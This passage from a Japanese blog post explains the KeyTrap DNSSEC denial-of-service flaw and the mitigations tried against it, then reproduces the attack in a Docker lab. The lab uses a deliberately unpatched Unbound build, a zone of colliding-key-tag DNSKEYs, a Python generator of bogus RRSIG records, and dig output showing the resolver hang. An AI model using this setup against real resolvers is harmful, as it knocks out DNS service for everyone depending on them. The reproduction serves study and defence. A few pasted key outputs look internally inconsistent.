最大でどのぐらいの秒数DoSになったという表が載っていますが、ここでもBINDは圧倒的です。さすが僕たちのBIND。Unboundは5回のリトライ処理があるため他より約6倍遅く、BINDはまだ試していない鍵を探すために毎回鍵を全探索しているらしく極端に非効率とのことです。あとはISCの説明にもあったようにDNSSECの検証と他の処理が同一スレッドで行われていたそうです。16時間応答不能となるともはやプロセス落ちたぐらいのインパクトです。

"The KeyTrap Denial-of-Service Algorithmic Complexity Attacks on DNS Version: January 2024" Table Ⅳより引用

上記以外にも署名検証中に行われた別の問い合わせの扱い、マルチスレッドの場合の違い、キャッシュされている応答の処理、継続的な攻撃による影響、いかに少ないクエリでDoSを引き起こすか、などがレポート内には書かれていますが細かい話なので省略します。

緩和策

根本的な解決をするためにはDNSSECの仕様を見直す必要があり、現状は各DNS実装で緩和策を入れているという状態ですが、その緩和策ですら難しいという話は面白かったです。興味ある人は"VII. THE PATH TO MITIGATIONS"を読んでみてください。概要だけ以下に書きます。

欠陥を緩和することは困難です。DNSSEC検証の欠陥は簡単に解決できるものではありません。例えば、潜在的な失敗を考慮して、ネームサーバーが複数のキーを返す正当な状況が存在します。例えば、すべてのリゾルバーによってまだサポートされていない新しい暗号を試験しているドメインがあり、キーロールオーバーが存在します。失敗を避けるために、ネームサーバーはすべての暗号資料を返すべきです。同様に、検証の成功を保証するために、リゾルバは最初の失敗した検証で失敗するべきではなく、検証が成功するまですべての資料を試すべきです。実際、§VII-Dで説明されている開発者とのパッチ作業を開始して以来の経験は、これらの欠陥をかなり緩和できることを示していますが、完全に解決することはできません。

上にも書いてありますが複数の鍵や署名が許されているのは必要だからであり、それを禁止するわけには行きません。なので現実的な緩和策として、まず検証失敗数の上限を設けたそうです。例えばAkamaiでは32回までを失敗の上限としたそうですが、結局これは1クエリあたりの制限なので複数クエリを送ればCPUを高負荷に出来たため効果的な対策ではないことが分かったとのことです。

他にも衝突する鍵の上限を設ける緩和策を実装したそうです。例えば、衝突する鍵タグを最大4つまでとします。自然に鍵タグが衝突することはほぼ起こらず、実際に60,000の署名付きゾーンを調べたところ2つ以上衝突する鍵を使用するゾーンはなかったため、この制限は通常の操作に影響を与えずに済みます。しかしSigJam攻撃の亜種でANYタイプを使うと、異なる鍵で署名された多数のRRSIGレコードを応答することが出来るため、鍵の衝突をさせなくても多数の署名検証を行わせることが出来ます。それぞれの署名を正当なものにしておけば署名失敗による上限に引っかかることもなく、全てのレコードセットの署名がチェックされるまで検証を続けます。この攻撃によりパッチを迂回してDoSすることが出来てしまいます。

結局、これらの緩和策に加え成否にかかわらず署名検証そのものの回数に上限を加えました。これらを適用してもなおCPUは高負荷になりますが、正当なトラフィックを失わないことを確認できたそうです。

この経緯を見て、どのぐらいのリクエストで応答不能になる場合に脆弱性とみなされるのか気になりました。1クエリでDoSになったら確かに脆弱性ですが、じゃあ秒間100クエリでDoSになる場合は？10,000クエリは？何か定義はあるんでしょうか。

そもそもDNSSECやめたら良くない？という話もあるとは思うのですが、今回のレポートではDNSSECは使う前提の上でどのように緩和するかについて述べられています。

再現方法

ここまでで脆弱性の原理を理解できたので実際に再現環境を作っていきます。以下のようなネットワークを作ります。resolverはBINDでもUnboundでも良かったのですが、今回はあまり使う機会のなかったUnboundにしました。

ChatGPTにDocker Composeでこのネットワーク作って、と図を投げてお願いしたらちゃんと作ってくれたのでそれをベースに必要なファイルをマウントしたり修正しました。最終的な docker-compose.yml を先に貼っておきます。

version : '3' services : attacker : build : ./attacker command : tail -f /dev/ null networks : app_net : ipv4_address : 10.10.0.2 resolver : build : ./resolver volumes : - ./resolver/unbound.conf:/usr/local/etc/unbound/unbound.conf - ./resolver/a.test.key:/usr/local/etc/unbound/a.test.key networks : app_net : ipv4_address : 10.10.0.3 auth : build : ./auth volumes : - ./auth/named:/etc/default/named - ./auth/named.conf:/var/named/chroot/etc/named.conf - ./auth/a.test.zone.signed:/var/named/chroot/var/named/a.test.zone.signed networks : app_net : ipv4_address : 10.10.0.4 networks : app_net : ipam : config : - subnet : 10.10.0.0/24

攻撃者

まず攻撃トリガー用のコンテナイメージを作成します。これはDNSクエリを1つ送るだけの存在なので何でも良いです。今回は dig を使うのでそれだけインストールしたコンテナイメージを作っておきます。

FROM alpine:3.19 RUN apk add bash bind-tools

リゾルバー（Unbound）

攻撃対象です。

Unboundのコンテナイメージ作成

リゾルバーとして動くUnboundをインストールしたコンテナイメージを作ります。最新版を入れると既にKeyTrapの緩和策を適用した1.19.1がインストールされてしまうので、ソースコードからビルドします。

FROM debian:12 # Install packages RUN apt-get update && apt-get install -y build-essential libexpat1-dev libssl-dev wget vim bash dnsutils # Download and extract the Unbound source code RUN wget https://nlnetlabs.nl/downloads/unbound/unbound-1.19.0.tar.gz \ && tar -xzvf unbound-1.19.0.tar.gz \ && rm unbound-1.19.0.tar.gz # Build and install Unbound from the source code RUN cd unbound-1.19.0 \ && ./configure \ && make \ && make install # Create unbound user and group RUN groupadd -r unbound && useradd -r -g unbound unbound # Run Unbound in the foreground CMD ["unbound", "-d"]

Unboundの設定ファイル作成

テクニカルレポートを見ると前半はCPU1コアで検証しています。後半でマルチスレッドの検証についても0.5ページぐらい割いていますが、複数クエリを送って全てのスレッドで署名検証を行わせることで結局DoSに繋がるという内容でした。もちろんスケジューリングの実装によっていくつのクエリを送るべきかは変わりますが、あまり今回の脆弱性の本質ではないと思うので今回の検証は num-threads: 1 を設定に追加して1コアで行います。

また、検証のために自分の用意した権威サーバに問い合わせを行わせたいので stub-zone の設定を追加します。今回は a.test というゾーンに関しては権威サーバである10.10.0.4（BIND）に問い合わせます。検証だし、ということで今回は .test を使ったのですが全然うまく動作せずハマりました。Unboundの設定を見たら .test は応答しないようになっていたようです。 local-zone: "test." nodefault を追記したら動くようになりました。

unbound/doc/example.conf.in at be27499d397e192bd43bff27bf0dcaa79020d024 · NLnetLabs/unbound · GitHub

実際に攻撃するときは攻撃者が所有する委譲されたゾーンを使うのでこのような特殊な設定は不要です。攻撃者の持つドメイン名を攻撃対象のリゾルバーに問い合わせるだけで攻撃が成立します。

出来上がったUnboundの設定ファイル（ unbound.yml ）は以下です。

server : num-threads : 1 interface : 0.0.0.0 port : 53 do-ip4 : yes do-ip6 : no do-udp : yes do-tcp : yes trust-anchor-file : "/usr/local/etc/unbound/a.test.key" access-control : 10.10.0.0/24 allow verbosity : 1 use-syslog : no local-zone : "test." nodefault stub-zone : name : "a.test" stub-addr : 10.10.0.4

ちなみにデバッグ中は verbosity: 4 にしておくと良いです。攻撃がうまくいくと以下のように署名検証に失敗しまくるログが見られます。

resolver_1 | [ 1708247200 ] unbound [ 1:0 ] debug: verify sig 6350 14 resolver_1 | [ 1708247200 ] unbound [ 1:0 ] debug: verify: signature mismatch resolver_1 | [ 1708247200 ] unbound [ 1:0 ] debug: verify: signature mismatch resolver_1 | [ 1708247200 ] unbound [ 1:0 ] debug: verify: signature mismatch resolver_1 | [ 1708247200 ] unbound [ 1:0 ] debug: verify: signature mismatch resolver_1 | [ 1708247200 ] unbound [ 1:0 ] debug: verify: signature mismatch resolver_1 | [ 1708247200 ] unbound [ 1:0 ] debug: verify: signature mismatch resolver_1 | [ 1708247200 ] unbound [ 1:0 ] debug: verify: signature mismatch resolver_1 | [ 1708247200 ] unbound [ 1:0 ] debug: verify: signature mismatch resolver_1 | [ 1708247200 ] unbound [ 1:0 ] debug: verify: signature mismatch

trust-anchor-file についてはKSKの説明時に合わせて説明します。

権威サーバー（BIND）

BINDのコンテナイメージ作成

BINDは権威サーバ側なので最新バージョンがインストールされるOSパッケージを使ってもよいのですが、「クセになってんだ BINDをソースコードからビルドするの」とキルアも言っていたので自分でビルドします。他の脆弱性で何度もやっているので説明は省略します。Dockerfileは最後にGitHubのリポジトリを貼っているのでそっちを見てください。

鍵タグが衝突する鍵の作成

上で説明したように鍵タグの衝突する鍵を用意することで、署名に使われた鍵の探索に時間をかけさせられます。アルゴリズムは上で説明したように一番計算が重いということでECDSAP384SHA384を使います。

この衝突する鍵をどうやって作るかですが、特に思いつかなかったので愚直に衝突するまで繰り返し作りました。賢い人ならもっと美しい方法を思いつきそうですが、力こそパワーということでただひたすら鍵を作り続けました。それでも30分ぐらいあれば鍵を100個ぐらい作れます。また、上述したように理論的には589個まで鍵を入れられるわけですが100個ぐらいでも十分な時間DoSを引き起こせます。ということで検証用に一旦100個作りました。今回は鍵タグが6350になるものを作成しました。最初に作った鍵のタグがその値だったのでそれに合わせただけで特に6350に意味はありません。

ECDSAP384SHA384は仕様上のアルゴリズム番号が14だったりZSKのフラグが256だったりするので、それらを適切に繋げてDNSKEYレコードのフォーマットにして以下のようにファイルに保存しておきます。

$ cat found_keys.txt | head -n 5 a. test . IN DNSKEY 256 3 14 qz2ys56wu+rPHXp62eskqFa/lYw4xl7oDT5X/wcj7fFapLq8zsOT3kM5E7IlKwa42cIqCcNcb6hG8C8YKWUOgUTOiXPXj7k4SO4K3/+CfFp+7J6ai8shKSFAMvhf2ajl a. test . IN DNSKEY 256 3 14 NJAIrXpcToloZ5CnSwyPf/Y8qyL3aFlqFr8Xcw/m19dBcyoJQIak5ygffLTHGrQhZNGM8TrL07v41sL1ZYuYjGBg7RBdMaeQr+JOUA4d5e/r83fkT7uHNOcHzOAhI7Nu a. test . IN DNSKEY 256 3 14 UiTl5T9RdFXTul4Nw3rQ9/zlGCODylgcI9mrz5SqpEkxw9+l+E00/JGxAj6If8yjE7Etexs/KTCX7csAYQTLq864iYB+5sPigcMHAzluyPU9fOUmALQbRtw3ZXPHBb7L a. test . IN DNSKEY 256 3 14 MjY4X0GT9jf00V9bZU7cMkceFGdUMgbeNK4afF6BB/VznyKXsZlTeX5IgrD/8BNWd1jMvvL5RlbBXbmy5022d34VqReK5IRA6WKxp9uzDBEpc6qoh2npdudDTsFMZKor a. test . IN DNSKEY 256 3 14 8y5y+PlI/MQAMADANSuw0UXq7WUGpGr+U+Y4sl+dAu78T+rZ1NUE1TVg5fZU7j7bO+Ie7Mk6DcquNT0zYX986pGJgXpx6jTDh3dztnt9Sc9SBcUdBw0v/u1y72EfLQ2P

10-20分ぐらいあれば簡単に作れるプログラムなので隠す意味がない気もしますが、攻撃に加担したいわけではないので一旦鍵生成のプログラムは載せずにおきます。

KSKの作成

上では簡単のために鍵と呼んでいましたが実際には各レコードセットを署名するためのゾーン署名鍵（ZSK）です。ZSKもDNSKEYレコードとして返されますが、これを信頼できるのかわからないのでZSKにも署名（RRSIG）が付与されます。これは鍵署名鍵（KSK）によって署名されます。大量のZSKを送りつけたいが、まずはそのZSKのDNSKEYレコードをリゾルバーに信頼してもらう必要があるのでこの大量のZSKを別途正当なKSKで署名します。というのが自分の理解ですが間違っていたらすみません。

$ dnssec-keygen -a ECDSAP384SHA384 -b 4096 -n ZONE -f KSK a. test

dnssec-keygen でKSKの公開鍵と秘密鍵のファイルが作成されるのでそれを適当に ksk.key と ksk.private にrenameしておきます。

ゾーンファイルの作成

まずは普通に a.test. のゾーンファイルを作成します。あとの検証で使いたいので適当なAレコードをいくつか足します。今回は www のAレコードに大量のRRSIGレコードを追加します。 www 以外は正常なリソースレコードです。

$ cat a. test .zone $TTL 86400 @ IN SOA ns1.a. test . admin.a. test . ( 2023102401 ; Serial 3600 ; Refresh 1800 ; Retry 604800 ; Expire 86400 ) ; Negative Cache TTL ; @ IN NS ns1.a. test . ns1 IN A 10 . 10 . 0 . 4 www IN A 10 . 10 . 0 . 4 a IN A 10 . 10 . 0 . 4 b IN A 10 . 10 . 0 . 4 c IN A 10 . 10 . 0 . 4

そして上のKSKのksk.keyの中身がDNSKEYのフォーマットになっているのでゾーンファイルに追記します。

$ cat ksk.key ; This is a zone-signing key, keyid 6350 , for a. test . ; Created: 20240217094927 ( Sat Feb 17 09:49:27 2024 ) ; Publish: 20240217094927 ( Sat Feb 17 09:49:27 2024 ) ; Activate: 20240217094927 ( Sat Feb 17 09:49:27 2024 ) a. test . IN DNSKEY 256 3 14 DcYreAh+USsK1mtv7bSR2iaQvShPUqCy7l/BRQXttAFupXp6pUaQZS+k ii+H2JJqd+rS4YgC3KCd/by8yQi5j+WSy2yRprSuFuDyqZMFnDT/Py+n GjmIa59$+W1iMdEYb $ cat ksk.key >> a. test .zone

そして上で作った鍵タグの衝突した大量のZSKも追記します。

$ cat found_keys.txt >> a. test .zone

これらのZSKは署名には使わずランダムに生成したRRSIGレコードを返すので（後述）、このいずれのZSKでも署名検証が成功しません。DNSKEYレコードとして返ってきますが何の検証にも使えないダミーです。リゾルバーは検証が成功するまで鍵を試していきますが、1つも成功しないので結局これらすべてのZSKを試すことになります。

ゾーンファイルの署名

上述したようにZSKのDNSKEYレコードに対してKSKで署名（RRSIGレコード）を作成する必要があります。これは dnssec-signzone コマンドで行えます。 a.test.zone ファイルを渡すと署名を付与して a.test.zone.signed ファイルを出力してくれます。 dnssec-signzone コマンドにゾーン名やKSKのファイルパスを渡して実行します。

$ dnssec-signzone -K . -N INCREMENT -o a. test -t a. test .zone ksk.key Verifying the zone using the following algorithms: - ECDSAP384SHA384 Missing ZSK for algorithm ECDSAP384SHA384 No correct ECDSAP384SHA384 signature for a. test NSEC3PARAM No correct ECDSAP384SHA384 signature for a. test SOA No correct ECDSAP384SHA384 signature for a. test NS No correct ECDSAP384SHA384 signature for a.a. test A No correct ECDSAP384SHA384 signature for b.a. test A No correct ECDSAP384SHA384 signature for c.a. test A No correct ECDSAP384SHA384 signature for d.a. test A No correct ECDSAP384SHA384 signature for e.a. test A No correct ECDSAP384SHA384 signature for ns1.a. test A No correct ECDSAP384SHA384 signature for www.a. test A No correct ECDSAP384SHA384 signature for 11O1NM552SHNJ6CP6A4LU2LR56P0GKP5.a. test NSEC3 No correct ECDSAP384SHA384 signature for 3IN16J1JT24R0R89VJKBB2N24PKVD7QL.a. test NSEC3 No correct ECDSAP384SHA384 signature for 6VA1LJ7EB0IMT58T1ULE4FTKLHOA6UJ9.a. test NSEC3 No correct ECDSAP384SHA384 signature for C5US2U7DNIN7LATGR8EV0KM6A1718G60.a. test NSEC3 No correct ECDSAP384SHA384 signature for E94ICI9GSPD9ALI175OIVR9K9JV57ELI.a. test NSEC3 No correct ECDSAP384SHA384 signature for T7DV3EGS2KB198VGQPMGGOV3LJM5HG9J.a. test NSEC3 No correct ECDSAP384SHA384 signature for U3KVP6DSV2MOHGALKQQT5K199FCHKB0E.a. test NSEC3 No correct ECDSAP384SHA384 signature for UL17RQK0O1NOII8C7UBN5ED7DPDCG635.a. test NSEC3 The zone is not fully signed for the following algorithms: ECDSAP384SHA384 . DNSSEC completeness test failed. Zone verification failed ( failure ) Signatures generated: 20 Signatures retained: 0 Signatures dropped: 0 Signatures successfully verified: 0 Signatures unsuccessfully verified: 0 Signing time in seconds: 0 . 040 Signatures per second: 500 . 000 Runtime in seconds: 4 . 330

エラーになりました。どうやらAレコードなどに署名ができないと言っています。確かに dnssec-signzone コマンドにKSKしか渡していないので、DNSKEYレコードに対する署名は出来るがゾーンに対する署名ができません。こちらでランダムなRRSIGレコードを作るのでゾーンの署名は不要なのですが（SOAの署名で必要かも？）、 dnssec-signzone を成功させるためにZSKを作っておきます。上のプログラムで作成した鍵タグが衝突するZSKから一つゾーン署名用に使ってもよいのですが、 dnssec-keygen で作ったほうが dnssec-signzone に渡しやすいので新たにZSKを生成します。

$ dnssec-keygen -a ECDSAP384SHA384 -b 2048 -n ZONE a. test

これを適当に zsk.key と zsk.private などにrenameしておきます。先ほどと同様、DNSKEYレコードのフォーマットになっています。

$ cat zsk.key ; This is a zone-signing key, keyid 6350 , for a. test . ; Created: 20240217094927 ( Sat Feb 17 09:49:27 2024 ) ; Publish: 20240217094927 ( Sat Feb 17 09:49:27 2024 ) ; Activate: 20240217094927 ( Sat Feb 17 09:49:27 2024 ) a. test . IN DNSKEY 256 3 14 DcYreAh+USsK1mtv7bSR2iaQvShPUqCy7l/BRQXttAFupXp6pUaQZS+k ii+H2JJqd+rS4YgC3KCd/by8yQi5j+WSy2yRprSuFuDyqZMFnDT/Py+n GjmIa59+W1iMdEYb

これをa.test.zoneに書き込みます。

$ cat zsk.key >> a. test .zone

そして zsk.key のパスも指定して dnssec-signzone を再度実行します。

root@e0f61a428aad:/auth# dnssec-signzone -K . -N INCREMENT -o a. test -t a. test .zone ksk.key zsk.key Verifying the zone using the following algorithms: - ECDSAP384SHA384 Zone fully signed: Algorithm: ECDSAP384SHA384: KSKs: 1 active, 0 stand-by, 0 revoked ZSKs: 1 active, 229 stand-by, 0 revoked a. test .zone.signed Signatures generated: 16 Signatures retained: 0 Signatures dropped: 0 Signatures successfully verified: 0 Signatures unsuccessfully verified: 0 Signing time in seconds: 0 . 020 Signatures per second: 800 . 000 Runtime in seconds: 0 . 660

無事に署名されました。

$ cat a. test .zone.signed ; File written on Sun Feb 18 10:14:35 2024 ; dnssec_signzone version 9 . 18 .24-1-Debian a. test . 86400 IN SOA ns1.a. test . admin.a. test . ( 2023102402 ; serial 3600 ; refresh ( 1 hour ) 1800 ; retry ( 30 minutes ) 604800 ; expire ( 1 week ) 86400 ; minimum ( 1 day ) ) ... 86400 DNSKEY 256 3 14 ( AJTptT8lmZiuZ+qd01/OiH2LHUk1VzL3RSNx ENG91nn0D1/vzl95ov6R4QPR3+Eu0he2G+bs 8m2N+05YzCRMRBOa0IqDHCD4yz7+ 2 +0rZUNA qs5ISE5bF+BoZLMXgXyQ ) ; ZSK; alg = ECDSAP384SHA384 ; key id = 6350 86400 DNSKEY 256 3 14 ( ASjorexlnfI2Ltb6bL2wWJ3X31rvPHFIyfpR AaMGaSyZWSIiZRNFF0n/7eJ+s+b17Jxiq6Rp MSrj2CJu1rrfrYSHxQK09NnlzjQoFM0qoEJa Cd0e/ZoqTiE9mgE7BPs9 ) ; ZSK; alg = ECDSAP384SHA384 ; key id = 6350 86400 DNSKEY 256 3 14 ( ZjfGUThRErubs8A1XoZgDvD0swkaMDS5TqnI 26xEAu9jxVdBKMf/8maFsYOrlIBGbKIwSSby Qpgc9wnX8zt4AHoSw4v7jf5xlh6Hluzy0GC2 1FQGw37h1PjMDzxWeeeN ) ; ZSK; alg = ECDSAP384SHA384 ; key id = 6350

key id = 6350 なDNSSECレコードが大量に並んでいます。このようなことは自然にはまず起こらないので異常事態です。緩和策では実際にこのように衝突する鍵の数を制限していたりします。

これらは先程 a.test.zone に追記した鍵タグが衝突しているZSKたちですが、 dnssec-signzone により整形されてコメントが付けられています。

86400 RRSIG DNSKEY 14 2 86400 ( 20240319155508 20240218155508 45000 a.test. YRXojMErbxlM0z7SM76xW8d+RMzf6lcjljpd KLCnVNahxW0vdESZSvzzCB+d8BcAfKeP0hPd lLLwWciF70oCpYsLNo8dlVSUGUylkFiedAvi 2NN2dgarOrTs+A1bNAeC ) 86400 RRSIG DNSKEY 14 2 86400 ( 20240319155508 20240218155508 30130 a.test. l4KWj/DSKeT8LKr1i+2fLHXkoaqdyI6aTNUo 0AGKakiOrLLzDisbw5bZtRzjCCqdsCsA9QuO wZ640P2k6xywKWMY1P+FDXtn/uuq3agzoNhi rJtTE1fKJd8Vb1YxUXuQ )

RRSIGに関してもDNSKEYレコードセットをKSKで署名したものが...と言おうとしたのですがなぜか2つあります。鍵タグ=30130がKSKなので自分の理解では下だけでよいはずなのですが、鍵タグ45000の先ほど dnssec-keygen で生成したZSKでも署名されています。バグを疑ったのですが、以下のオプションを見つけたのでどうやら意図的なようです。

-x: sign DNSKEY record with KSKs only, not ZSKs

実際上のRRSIGを削除しても署名検証には成功するので、ZSKでDNSKEYレコードを署名している理由はよくわかっていません。可用性の関係でZSKで署名されている場合にも対応できるようにしているのかもしれませんが、いまいちしっくり来てないです。やはり試してみると教科書には載っていないことがたくさんあります。誰か詳しい方教えてください。

一旦ZSKで署名したRRSIGのことは忘れてKSKによる署名だけを考えます。KSKの秘密鍵で署名しているので公開鍵で復号してハッシュ値を比較すればこのDNSKEYレコードセットは改ざんされていないことが証明できるわけですが、そもそもこのKSKは信頼できるの？という話があります。ここで信頼の連鎖の話になりますが、本来は親ゾーンにDSリソースレコードを登録します。このDSリソースレコードはKSKの公開鍵のハッシュ値が格納されており、それをさらに親ゾーンの秘密鍵で署名することで信頼を繋いでいき、最終的には信頼の起点、トラストアンカーとなるルートゾーンの公開鍵あるいはそのハッシュ値をリゾルバーに事前インストールすることで、検証可能にします。SSL/TLS証明書とほぼ同じ仕組みと思って良いです。

実際に攻撃する場合はちゃんと親ゾーンにDSレコードを登録する必要がありますが、今回は検証なので先ほど生成したKSKをUnboundのトラストアンカーに設定してしまいます。以下のようにKSKのDNSKEYリソースレコードを含んだトラストアンカー用のファイルを作ります。

$ cat a. test .key ; autotrust trust anchor file ;; id: a. test . 1 ;; last_queried: 1708093496 ;; Fri Feb 16 14:24:56 2024 ;; last_success: 1708093496 ;; Fri Feb 16 14:24:56 2024 ;; next_probe_time: 1708135970 ;; Sat Feb 17 02:12:50 2024 ;; query_failed: 0 ;; query_interval: 43200 ;; retry_time: 8640 a. test . 86400 IN DNSKEY 257 3 14 MzJsFTtAo0j8qGpDIhEMnK4ImTyYwMwDPU5gt/FaXd6TOw6AvZDAj2hl hZvaxMXV6xCw1MU5iPv5ZQrb3NDLUU+TW07imJ5GD9YKi0Qiiypo+zht L4aGaOG+870yHwuY

これをUnboundが読み込むように、 unbound.conf に trust-anchor-file を追記します。

# DNSSEC settings trust-anchor-file: "/usr/local/etc/unbound/a.test.key"

これでUnboundはBINDのKSKを信頼するようになります。

署名を生成する

dnssec-signzone により生成された a.test.zone.signed ファイルではAレコードに署名が行われています。

www.a. test . 86400 IN A 10 . 10 . 0 . 4 86400 RRSIG A 14 3 86400 ( 20240319155508 20240218155508 6350 a. test . 4h+KDqE8piyNhfEWeAEVYw0nw4NaAv9zkZK7 +c7tgV54HHGJYsyMPYdJwgF+Fo02Ky4aSbaN uqsI/jJg/2hHmOS0MvAMRHyeMVsNHx2aoTvw dbkzxlWJKGXfUCQGSp3y )

このRRSIGレコードを返してしまうと署名検証に成功してしまうので、これは削除しておきます。成功してしまうとその時点で検証が終わってしまい最大限の負荷をかけられないためです。

そして次にランダムに署名を生成します。署名検証が失敗さえすればいいので本当に単にランダムなバイト列を使えばよいです。署名部分以外は予め定められている値を入れればよいので以下のようにRRSIGレコードは生成できます。

$ cat rrsig.py import time from datetime import datetime, timezone from cryptography.hazmat.primitives.asymmetric import ec from cryptography.hazmat.backends import default_backend import base64 import os def create_dummy_signature (): dummy_signature = os.urandom( 96 ) return base64.b64encode(dummy_signature).decode( 'utf-8' ) def create_dummy_rrsig (signer_name, type_covered, algorithm, labels, original_ttl, expiration, inception, key_tag): dummy_signature = create_dummy_signature() inception_date = datetime.fromtimestamp(inception, timezone.utc).strftime( '%Y%m%d%H%M%S' ) expiration_date = datetime.fromtimestamp(expiration, timezone.utc).strftime( '%Y%m%d%H%M%S' ) rrsig_record = f "{type_covered} {algorithm} {labels} {original_ttl} {expiration_date} " \ f "{inception_date} {key_tag} {signer_name} {dummy_signature}" return rrsig_record signer_name = "a.test." type_covered = "A" algorithm = 14 labels = 3 original_ttl = 86400 current_time = int (time.time()) expiration = current_time + 7 * 24 * 3600 inception = current_time - 24 * 3600 key_tag = 6350 for i in range ( 100 ): dummy_rrsig = create_dummy_rrsig(signer_name, type_covered, algorithm, labels, original_ttl, expiration, inception, key_tag) print (f " \t\t\t 86400 \t RRSIG \t {dummy_rrsig}" )

今回の例では100個のRRSIGレコードを生成してします。これらを先程削除した検証の通るRRSIGの代わりにAレコードの下に以下のように追記します。

www.a.test. 86400 IN A 10.10.0.4 86400 RRSIG A 14 3 86400 20240225170322 20240217170322 6350 a.test. dkHeVIaiLQk5OVmn+LivRfSsd0TQcppzjKn9uFn1W0LzBRXBxuZBd4Lrou+eigkJH6nwJSj9NQJwkLtRJRcoKSaEDcTry0q58I23P4/rpuegho/YNeMyzFQ2rjjGwd/1 86400 RRSIG A 14 3 86400 20240225170322 20240217170322 6350 a.test. Wku/hZ+/OSUoovZfXARQ8nZDsoUkmdTMv+WN9BcrmIbXlka3EdAjCBcYgHFV9rI5a4hTvWaYUo6HMohsN6HSEh4OsXyToUpmLeJUDaJ3tZ/JtVgimD88j2eEBb8IIPOZ 86400 RRSIG A 14 3 86400 20240225170322 20240217170322 6350 a.test. wYN/ggDmhMp5n0R/jvn4EBv6Uq1VuLF4FTXUd8fzeiJS0mgbMNLX/QtlmpZVUueAcJ1FplbwDPX3JyMhDiYMdM+x9rlHeqOvpssVXeHDMXxWDvkAR+/QYhrcRecdQ8f7 ...

これで準備完了です。

攻撃の再現

まずはDocker Composeを立ち上げます。

$ docker compose up --build ... resolver-1 | [ 1708276073 ] unbound [ 1:0 ] debug: creating udp4 socket 0 . 0 . 0 . 0 53 resolver-1 | [ 1708276073 ] unbound [ 1:0 ] debug: creating tcp4 socket 0 . 0 . 0 . 0 53 resolver-1 | [ 1708276073 ] unbound [ 1:0 ] debug: chdir to /usr/local/etc/unbound resolver-1 | [ 1708276073 ] unbound [ 1:0 ] debug: chroot to /usr/local/etc/unbound resolver-1 | [ 1708276073 ] unbound [ 1:0 ] debug: drop user privileges, run as unbound resolver-1 | [ 1708276073 ] unbound [ 1:0 ] debug: switching log to stderr resolver-1 | [ 1708276073 ] unbound [ 1:0 ] debug: module config: " validator iterator " resolver-1 | [ 1708276073 ] unbound [ 1:0 ] notice: init module 0: validator resolver-1 | [ 1708276073 ] unbound [ 1:0 ] info: adding trusted key a. test . DNSKEY IN resolver-1 | [ 1708276073 ] unbound [ 1:0 ] debug: validator nsec3cfg keysz 1024 mxiter 150 resolver-1 | [ 1708276073 ] unbound [ 1:0 ] debug: validator nsec3cfg keysz 2048 mxiter 150 resolver-1 | [ 1708276073 ] unbound [ 1:0 ] debug: validator nsec3cfg keysz 4096 mxiter 150 resolver-1 | [ 1708276073 ] unbound [ 1:0 ] notice: init module 1: iterator resolver-1 | [ 1708276073 ] unbound [ 1:0 ] debug: target fetch policy for level 0 is 3 resolver -1 | [ 1708276073 ] unbound [ 1:0 ] debug: target fetch policy for level 1 is 2 resolver -1 | [ 1708276073 ] unbound [ 1:0 ] debug: target fetch policy for level 2 is 1 resolver -1 | [ 1708276073 ] unbound [ 1:0 ] debug: target fetch policy for level 3 is 0 resolver -1 | [ 1708276073 ] unbound [ 1:0 ] debug: target fetch policy for level 4 is 0 resolver -1 | [ 1708276073 ] unbound [ 1:0 ] debug: donotq: 127 . 0 . 0 . 0 / 8 resolver -1 | [ 1708276073 ] unbound [ 1:0 ] debug: total of 59446 outgoing ports available resolver -1 | [ 1708276073 ] unbound [ 1:0 ] debug: start threads resolver -1 | [ 1708276073 ] unbound [ 1:0 ] debug: mini-event internal uses select method. resolver -1 | [ 1708276073 ] unbound [ 1:0 ] info: DelegationPoint < a. test . > : 0 names ( 0 missing ) , 1 addrs ( 0 result, 1 avail ) parentNS resolver -1 | [ 1708276073 ] unbound [ 1:0 ] debug: ip4 10 . 10 . 0 . 4 port 53 ( len 16 ) resolver -1 | [ 1708276073 ] unbound [ 1:0 ] debug: no config, using builtin root hints. resolver -1 | [ 1708276073 ] unbound [ 1:0 ] debug: cache memory msg = 66104 rrset = 66104 infra = 7904 val = 66400 resolver -1 | [ 1708276073 ] unbound [ 1:0 ] info: start of service ( unbound 1 . 19 . 0 ) . auth -1 | 18-Feb-2024 17:07:53. 450 managed-keys-zone: Initializing automatic trust anchor management for zone ' . '; DNSKEY ID 20326 is now trusted, waiving the normal 30-day waiting period. auth -1 | 18-Feb-2024 17:07:53. 450 resolver priming query complete

authもresolverも良い感じに立ち上がりました。この状態で attacker コンテナーから resolver コンテナーに対して正常なAリソースレコードを引きます。

$ docker compose exec -it attacker dig +noall +ans @ 10 . 10 . 0 . 3 a.a. test ; <<>> DiG 9 . 18 . 24 <<>> @ 10 . 10 . 0 . 3 a.a. test ; ( 1 server found ) ;; global options: +cmd ;; Got answer: ;; - >> HEADER <<- opcode: QUERY, status: NOERROR, id: 4946 ;; flags: qr rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 1232 ;; QUESTION SECTION: ;a.a.test. IN A ;; ANSWER SECTION: a.a.test. 86318 IN A 10.10.0.4 ;; Query time: 0 msec ;; SERVER: 10.10.0.3#53(10.10.0.3) (UDP) ;; WHEN: Sun Feb 18 17:29:55 UTC 2024 ;; MSG SIZE rcvd: 53

正常に返ってきます。また、adフラグが経っていることからDNSSECの検証が成功していることが分かります。この時点でもDNSKEYリソースレコードは大量に返されていますが、このAレコードに対するRRSIGリソースレコードは一つである点と、そのRRSIGリソースレコードは正常に作られた署名であるという点から、そこまで時間がかからずに返ってきます。

では次に大量のRRSIGリソースレコードを返してくる www.a.test を引くDNSクエリを一つだけ投げます。

$ docker compose exec -it attacker dig @ 10 . 10 . 0 . 3 www.a. test ;; communications error to 10 . 10 . 0 . 3# 53: timed out ;; communications error to 10 . 10 . 0 . 3# 53: timed out ;; communications error to 10 . 10 . 0 . 3# 53: timed out ; <<>> DiG 9 . 18 . 24 <<>> @ 10 . 10 . 0 . 3 www.a. test ; ( 1 server found ) ;; global options: +cmd ;; no servers could be reached

タイムアウトになり全く返ってきません。全ての鍵と署名の組み合わせを試しているため非常に時間がかかります。ではその間に先程のAリソースレコードを再度引いてみます。

$ docker compose exec -it attacker dig @ 10 . 10 . 0 . 3 a.a. test ;; communications error to 10 . 10 . 0 . 3# 53: timed out ;; communications error to 10 . 10 . 0 . 3# 53: timed out ;; communications error to 10 . 10 . 0 . 3# 53: timed out ; <<>> DiG 9 . 18 . 24 <<>> @ 10 . 10 . 0 . 3 a.a. test ; ( 1 server found ) ;; global options: +cmd ;; no servers could be reached

